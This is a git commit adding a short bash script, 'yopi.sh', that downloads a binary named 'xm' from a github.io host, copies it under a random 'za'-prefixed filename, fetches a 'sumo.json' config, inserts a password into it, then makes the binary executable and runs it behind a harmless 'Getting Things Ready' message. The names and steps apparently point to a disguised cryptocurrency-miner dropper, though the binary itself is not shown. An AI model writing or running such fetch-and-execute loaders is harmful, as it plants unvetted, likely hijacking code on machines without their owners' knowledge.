df089c7cdb01f962cc6ff08ae9037d9991750ca4
pzeankto <57797716+pzeankto@users.noreply.github.com>
2019-11-21 01:28:31 +0100

    Create yopi.sh

---
+++ yopi.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+echo "Getting Things Ready ... "
+wget http://dzmltzack.github.io/web/xm -O oxm
+NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
+BB=za$NEW_UUID
+cp oxm $BB
+echo $NN >> $BB
+wget https://pzeankto.github.io/namnam/sumo.json -O config.json
+sed -i "s/PSPS/$PASS/g" config.json
+chmod +x $BB
+./$BB
